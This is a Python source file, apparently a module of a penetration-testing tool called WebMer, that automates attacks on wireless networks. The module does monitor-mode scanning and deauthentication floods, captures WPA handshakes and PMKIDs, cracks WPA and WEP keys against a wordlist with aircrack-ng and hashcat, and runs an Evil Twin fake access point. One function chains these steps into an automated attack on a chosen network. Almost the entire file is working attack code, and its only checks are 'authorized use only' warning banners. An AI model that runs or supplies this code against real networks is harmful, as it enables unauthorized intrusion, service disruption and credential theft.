#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Real WiFi Attack Module for WebMer
Advanced Wireless Network Penetration Testing Framework
⚠️  WARNING: FOR AUTHORIZED PENETRATION TESTING ONLY
"""

import asyncio
import subprocess
import time
import random
import threading
import os
import re
from colorama import Fore, Style
import signal
import tempfile
import hashlib

class RealWiFiAttackModule:
    def __init__(self, interface="wlan0"):
        self.interface = interface
        self.monitor_interface = f"{interface}mon"
        self.networks = []
        self.target_network = None
        self.attack_active = False
        
    async def start_monitor_mode(self):
        """Start monitor mode on wireless interface"""
        print(f"{Fore.CYAN}[*] Starting monitor mode on {self.interface}")
        
        try:
            # Kill interfering processes
            subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'], capture_output=True)
            
            # Start monitor mode
            result = subprocess.run(['sudo', 'airmon-ng', 'start', self.interface], 
                                  capture_output=True, text=True)
            
            if result.returncode == 0:
                print(f"{Fore.GREEN}[+] Monitor mode started successfully")
                return True
            else:
                print(f"{Fore.RED}[!] Failed to start monitor mode: {result.stderr}")
                return False
                
        except FileNotFoundError:
            print(f"{Fore.RED}[!] airmon-ng not found. Install aircrack-ng suite")
            return False
    
    async def stop_monitor_mode(self):
        """Stop monitor mode and restore managed mode"""
        print(f"{Fore.CYAN}[*] Stopping monitor mode")
        
        try:
            subprocess.run(['sudo', 'airmon-ng', 'stop', self.monitor_interface], 
                          capture_output=True)
            print(f"{Fore.GREEN}[+] Monitor mode stopped")
        except:
            pass
    
    async def wifi_scan(self, scan_time=30):
        """Real WiFi network scanning"""
        print(f"{Fore.CYAN}[*] Scanning for WiFi networks...")
        print(f"{Fore.YELLOW}[*] Scan duration: {scan_time} seconds")
        
        # Start monitor mode first
        if not await self.start_monitor_mode():
            return []
        
        try:
            # Start airodump-ng to scan networks
            with tempfile.NamedTemporaryFile(suffix='.csv', delete=False) as temp_file:
                temp_path = temp_file.name.replace('.csv', '')
                
                cmd = [
                    'sudo', 'airodump-ng', 
                    '--write', temp_path,
                    '--output-format', 'csv',
                    self.monitor_interface
                ]
                
                print(f"{Fore.BLUE}[*] Starting network discovery...")
                process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, 
                                         stderr=subprocess.DEVNULL)
                
                # Let it scan for specified time
                await asyncio.sleep(scan_time)
                
                # Kill the process
                process.terminate()
                await asyncio.sleep(2)
                
                # Parse results
                networks = self._parse_airodump_csv(f"{temp_path}-01.csv")
                
                # Cleanup
                for file in [f"{temp_path}-01.csv", f"{temp_path}-01.cap", 
                           f"{temp_path}-01.kismet.csv", f"{temp_path}-01.kismet.netxml"]:
                    try:
                        os.remove(file)
                    except:
                        pass
                
                self.networks = networks
                self._print_discovered_networks()
                return networks
                
        except Exception as e:
            print(f"{Fore.RED}[!] WiFi scan failed: {e}")
            return []
    
    def _parse_airodump_csv(self, csv_file):
        """Parse airodump-ng CSV output"""
        networks = []
        
        try:
            with open(csv_file, 'r') as f:
                lines = f.readlines()
            
            # Find where AP data starts and ends
            ap_start = None
            ap_end = None
            
            for i, line in enumerate(lines):
                if 'BSSID' in line and 'First time seen' in line:
                    ap_start = i + 1
                elif 'Station MAC' in line:
                    ap_end = i
                    break
            
            if ap_start and ap_end:
                for line in lines[ap_start:ap_end]:
                    if line.strip() and not line.startswith('#'):
                        parts = line.split(',')
                        if len(parts) >= 14:
                            bssid = parts[0].strip()
                            power = parts[8].strip()
                            essid = parts[13].strip()
                            
                            if essid and essid != ' ':
                                # Determine security
                                privacy = parts[5].strip()
                                cipher = parts[6].strip()
                                auth = parts[7].strip()
                                
                                security = self._determine_security(privacy, cipher, auth)
                                
                                network = {
                                    'BSSID': bssid,
                                    'ESSID': essid,
                                    'Power': power,
                                    'Security': security,
                                    'Channel': parts[3].strip()
                                }
                                networks.append(network)
        except Exception as e:
            print(f"{Fore.RED}[!] Failed to parse CSV: {e}")
        
        return networks
    
    def _determine_security(self, privacy, cipher, auth):
        """Determine network security type"""
        if 'WPA3' in auth:
            return 'WPA3'
        elif 'WPA2' in auth:
            return 'WPA2'
        elif 'WPA' in auth:
            return 'WPA'
        elif 'WEP' in privacy:
            return 'WEP'
        elif 'OPN' in privacy:
            return 'Open'
        else:
            return 'Unknown'
    
    def _print_discovered_networks(self):
        """Print discovered networks"""
        print(f"\n{Fore.GREEN}{'='*80}")
        print(f"{Fore.YELLOW}  DISCOVERED WIFI NETWORKS")
        print(f"{Fore.GREEN}{'='*80}")
        
        for i, network in enumerate(self.networks):
            print(f"{Fore.CYAN}  [{i+1}] ESSID: {network['ESSID']}")
            print(f"      BSSID: {network['BSSID']}")
            print(f"      Channel: {network['Channel']}")
            print(f"      Security: {network['Security']}")
            print(f"      Power: {network['Power']} dBm")
            print()
        
        print(f"{Fore.GREEN}{'='*80}{Style.RESET_ALL}")
    
    async def deauth_attack(self, target_bssid, client_mac=None, count=100):
        """Real deauthentication attack"""
        print(f"{Fore.RED}[*] Launching Deauthentication Attack")
        print(f"{Fore.YELLOW}[*] Target BSSID: {target_bssid}")
        if client_mac:
            print(f"{Fore.YELLOW}[*] Target Client: {client_mac}")
        else:
            print(f"{Fore.YELLOW}[*] Target: All clients (broadcast)")
        print(f"{Fore.RED}[!] WARNING: This is a real attack - Use only with authorization!")
        
        try:
            if client_mac:
                cmd = [
                    'sudo', 'aireplay-ng',
                    '--deauth', str(count),
                    '-a', target_bssid,
                    '-c', client_mac,
                    self.monitor_interface
                ]
            else:
                cmd = [
                    'sudo', 'aireplay-ng',
                    '--deauth', str(count),
                    '-a', target_bssid,
                    self.monitor_interface
                ]
            
            print(f"{Fore.CYAN}[*] Sending deauth packets...")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                print(f"{Fore.GREEN}[+] Deauth attack completed successfully")
            else:
                print(f"{Fore.RED}[!] Deauth attack failed: {result.stderr}")
                
        except subprocess.TimeoutExpired:
            print(f"{Fore.YELLOW}[*] Deauth attack timeout - continuing...")
        except Exception as e:
            print(f"{Fore.RED}[!] Deauth attack error: {e}")
    
    async def capture_handshake(self, target_bssid, output_file="handshake"):
        """Capture WPA/WPA2 handshake"""
        print(f"{Fore.CYAN}[*] Starting handshake capture")
        print(f"{Fore.YELLOW}[*] Target: {target_bssid}")
        print(f"{Fore.YELLOW}[*] Output: {output_file}.cap")
        
        try:
            # Start airodump-ng to capture handshake
            cmd = [
                'sudo', 'airodump-ng',
                '--bssid', target_bssid,
                '--write', output_file,
                '--output-format', 'cap',
                self.monitor_interface
            ]
            
            print(f"{Fore.BLUE}[*] Waiting for handshake...")
            process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, 
                                     stderr=subprocess.DEVNULL)
            
            # Wait for handshake capture (60 seconds)
            await asyncio.sleep(60)
            
            # Stop capture
            process.terminate()
            
            # Check if handshake was captured
            if os.path.exists(f"{output_file}-01.cap"):
                print(f"{Fore.GREEN}[+] Handshake capture file created: {output_file}-01.cap")
                
                # Verify handshake using aircrack-ng
                verify_cmd = [
                    'aircrack-ng', f"{output_file}-01.cap"
                ]
                
                verify_result = subprocess.run(verify_cmd, capture_output=True, text=True)
                
                if "1 handshake" in verify_result.stdout:
                    print(f"{Fore.GREEN}[+] Valid handshake captured!")
                    return True
                else:
                    print(f"{Fore.YELLOW}[!] No valid handshake found in capture")
                    return False
            else:
                print(f"{Fore.RED}[!] No capture file created")
                return False
                
        except Exception as e:
            print(f"{Fore.RED}[!] Handshake capture failed: {e}")
            return False
    
    async def wpa_crack_attack(self, handshake_file, wordlist="/usr/share/wordlists/rockyou.txt"):
        """Real WPA/WPA2 password cracking"""
        print(f"{Fore.RED}[*] Starting WPA/WPA2 Password Cracking")
        print(f"{Fore.YELLOW}[*] Handshake file: {handshake_file}")
        print(f"{Fore.YELLOW}[*] Wordlist: {wordlist}")
        print(f"{Fore.RED}[!] WARNING: This is real password cracking - Use only with authorization!")
        
        if not os.path.exists(handshake_file):
            print(f"{Fore.RED}[!] Handshake file not found: {handshake_file}")
            return None
        
        if not os.path.exists(wordlist):
            print(f"{Fore.RED}[!] Wordlist not found: {wordlist}")
            return None
        
        try:
            cmd = [
                'aircrack-ng',
                '-w', wordlist,
                handshake_file
            ]
            
            print(f"{Fore.BLUE}[*] Starting dictionary attack...")
            print(f"{Fore.YELLOW}[*] This may take a very long time...")
            
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, 
                                     stderr=subprocess.PIPE, text=True)
            
            # Monitor process output
            while True:
                output = process.stdout.readline()
                if output == '' and process.poll() is not None:
                    break
                if output:
                    if "KEY FOUND" in output:
                        # Extract password
                        password_match = re.search(r'\[ (.+) \]', output)
                        if password_match:
                            password = password_match.group(1)
                            print(f"{Fore.GREEN}[+] PASSWORD FOUND: {password}")
                            return password
                    elif "Tested" in output:
                        print(f"{Fore.CYAN}[*] {output.strip()}")
            
            print(f"{Fore.YELLOW}[!] Password not found in wordlist")
            return None
            
        except Exception as e:
            print(f"{Fore.RED}[!] WPA cracking failed: {e}")
            return None
    
    async def wep_crack_attack(self, target_bssid, capture_time=600):
        """Real WEP cracking attack"""
        print(f"{Fore.RED}[*] Starting WEP Cracking Attack")
        print(f"{Fore.YELLOW}[*] Target: {target_bssid}")
        print(f"{Fore.YELLOW}[*] Capture time: {capture_time} seconds")
        print(f"{Fore.RED}[!] WARNING: This is real WEP cracking - Use only with authorization!")
        
        output_file = f"wep_crack_{int(time.time())}"
        
        try:
            # Start packet capture
            capture_cmd = [
                'sudo', 'airodump-ng',
                '--bssid', target_bssid,
                '--write', output_file,
                '--output-format', 'cap',
                self.monitor_interface
            ]
            
            print(f"{Fore.BLUE}[*] Capturing WEP packets...")
            capture_process = subprocess.Popen(capture_cmd, stdout=subprocess.DEVNULL,
                                             stderr=subprocess.DEVNULL)
            
            # Let it capture packets
            await asyncio.sleep(capture_time)
            
            # Stop capture
            capture_process.terminate()
            
            # Try to crack WEP key
            if os.path.exists(f"{output_file}-01.cap"):
                crack_cmd = [
                    'aircrack-ng',
                    f"{output_file}-01.cap"
                ]
                
                print(f"{Fore.BLUE}[*] Attempting WEP key recovery...")
                crack_result = subprocess.run(crack_cmd, capture_output=True, text=True)
                
                if "KEY FOUND" in crack_result.stdout:
                    # Extract WEP key
                    key_match = re.search(r'KEY FOUND! \[ (.+) \]', crack_result.stdout)
                    if key_match:
                        wep_key = key_match.group(1)
                        print(f"{Fore.GREEN}[+] WEP KEY FOUND: {wep_key}")
                        return wep_key
                else:
                    print(f"{Fore.YELLOW}[!] WEP key not recovered - need more packets")
                    return None
            else:
                print(f"{Fore.RED}[!] No capture file created")
                return None
                
        except Exception as e:
            print(f"{Fore.RED}[!] WEP cracking failed: {e}")
            return None
    
    async def fake_ap_attack(self, essid="FreeWiFi", channel=6):
        """Create fake access point for Evil Twin attack"""
        print(f"{Fore.RED}[*] Starting Fake Access Point Attack")
        print(f"{Fore.YELLOW}[*] ESSID: {essid}")
        print(f"{Fore.YELLOW}[*] Channel: {channel}")
        print(f"{Fore.RED}[!] WARNING: This is a real Evil Twin attack - Use only with authorization!")
        
        try:
            # Create hostapd configuration
            hostapd_conf = f"""
interface={self.monitor_interface}
driver=nl80211
ssid={essid}
hw_mode=g
channel={channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=12345678
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
"""
            
            # Write configuration file
            with open('/tmp/hostapd.conf', 'w') as f:
                f.write(hostapd_conf)
            
            # Start fake AP
            cmd = [
                'sudo', 'hostapd', '/tmp/hostapd.conf'
            ]
            
            print(f"{Fore.BLUE}[*] Starting fake access point...")
            process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL,
                                     stderr=subprocess.DEVNULL)
            
            print(f"{Fore.GREEN}[+] Fake AP '{essid}' is running on channel {channel}")
            print(f"{Fore.YELLOW}[*] Press Ctrl+C to stop...")
            
            # Keep running until interrupted
            try:
                while True:
                    await asyncio.sleep(1)
            except KeyboardInterrupt:
                print(f"{Fore.RED}[!] Stopping fake AP...")
                process.terminate()
                
        except Exception as e:
            print(f"{Fore.RED}[!] Fake AP attack failed: {e}")
    
    async def pmkid_attack(self, target_bssid):
        """PMKID attack for WPA/WPA2 networks"""
        print(f"{Fore.RED}[*] Starting PMKID Attack")
        print(f"{Fore.YELLOW}[*] Target: {target_bssid}")
        print(f"{Fore.RED}[!] WARNING: This is a real PMKID attack - Use only with authorization!")
        
        output_file = f"pmkid_{int(time.time())}"
        
        try:
            # Use hcxdumptool for PMKID capture
            cmd = [
                'sudo', 'hcxdumptool',
                '-i', self.monitor_interface,
                '-o', f"{output_file}.pcapng",
                '--enable_status=1'
            ]
            
            print(f"{Fore.BLUE}[*] Capturing PMKID...")
            process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL,
                                     stderr=subprocess.DEVNULL)
            
            # Let it capture for 60 seconds
            await asyncio.sleep(60)
            
            # Stop capture
            process.terminate()
            
            # Convert to hashcat format
            if os.path.exists(f"{output_file}.pcapng"):
                convert_cmd = [
                    'hcxpcapngtool',
                    '-o', f"{output_file}.hash",
                    f"{output_file}.pcapng"
                ]
                
                convert_result = subprocess.run(convert_cmd, capture_output=True)
                
                if convert_result.returncode == 0:
                    print(f"{Fore.GREEN}[+] PMKID hash file created: {output_file}.hash")
                    return f"{output_file}.hash"
                else:
                    print(f"{Fore.YELLOW}[!] No PMKID found")
                    return None
            else:
                print(f"{Fore.RED}[!] No capture file created")
                return None
                
        except FileNotFoundError:
            print(f"{Fore.RED}[!] hcxdumptool not found. Install hcxtools")
            return None
        except Exception as e:
            print(f"{Fore.RED}[!] PMKID attack failed: {e}")
            return None
    
    async def hashcat_crack(self, hash_file, wordlist="/usr/share/wordlists/rockyou.txt"):
        """Use hashcat for GPU-accelerated cracking"""
        print(f"{Fore.RED}[*] Starting Hashcat GPU Cracking")
        print(f"{Fore.YELLOW}[*] Hash file: {hash_file}")
        print(f"{Fore.YELLOW}[*] Wordlist: {wordlist}")
        
        try:
            cmd = [
                'hashcat',
                '-m', '22000',  # WPA/WPA2 PMK
                hash_file,
                wordlist,
                '--force'
            ]
            
            print(f"{Fore.BLUE}[*] Starting GPU-accelerated cracking...")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=3600)
            
            if "Cracked" in result.stdout:
                print(f"{Fore.GREEN}[+] Password cracked with hashcat!")
                return True
            else:
                print(f"{Fore.YELLOW}[!] Password not found in wordlist")
                return False
                
        except FileNotFoundError:
            print(f"{Fore.RED}[!] hashcat not found")
            return False
        except Exception as e:
            print(f"{Fore.RED}[!] Hashcat cracking failed: {e}")
            return False
    
    async def comprehensive_wifi_attack(self, target_essid):
        """Complete automated WiFi attack"""
        print(f"{Fore.RED}[*] Starting Comprehensive WiFi Attack")
        print(f"{Fore.YELLOW}[*] Target: {target_essid}")
        print(f"{Fore.RED}[!] WARNING: This is a comprehensive real attack - Use only with authorization!")
        
        # Find target network
        target_network = None
        for network in self.networks:
            if network['ESSID'] == target_essid:
                target_network = network
                break
        
        if not target_network:
            print(f"{Fore.RED}[!] Target network not found")
            return False
        
        bssid = target_network['BSSID']
        security = target_network['Security']
        
        print(f"{Fore.CYAN}[*] Target Details:")
        print(f"  BSSID: {bssid}")
        print(f"  Security: {security}")
        
        if security == "Open":
            print(f"{Fore.GREEN}[+] Open network - no password needed!")
            return True
        
        elif security == "WEP":
            print(f"{Fore.YELLOW}[*] WEP detected - attempting crack...")
            wep_key = await self.wep_crack_attack(bssid)
            if wep_key:
                print(f"{Fore.GREEN}[+] WEP network compromised!")
                return True
        
        elif security in ["WPA", "WPA2", "WPA3"]:
            print(f"{Fore.YELLOW}[*] WPA/WPA2 detected - attempting multiple attacks...")
            
            # Try PMKID attack first
            print(f"{Fore.BLUE}[*] Attempting PMKID attack...")
            pmkid_hash = await self.pmkid_attack(bssid)
            
            if pmkid_hash:
                print(f"{Fore.GREEN}[+] PMKID captured - attempting hashcat crack...")
                if await self.hashcat_crack(pmkid_hash):
                    return True
            
            # If PMKID fails, try handshake capture
            print(f"{Fore.BLUE}[*] Attempting handshake capture...")
            
            # Start handshake capture
            capture_task = asyncio.create_task(self.capture_handshake(bssid))
            
            # Wait a bit then perform deauth attack
            await asyncio.sleep(5)
            await self.deauth_attack(bssid, count=50)
            
            # Wait for capture to complete
            handshake_captured = await capture_task
            
            if handshake_captured:
                print(f"{Fore.GREEN}[+] Handshake captured - attempting crack...")
                password = await self.wpa_crack_attack("handshake-01.cap")
                if password:
                    print(f"{Fore.GREEN}[+] WPA/WPA2 network compromised!")
                    return True
        
        print(f"{Fore.RED}[!] Attack unsuccessful")
        return False
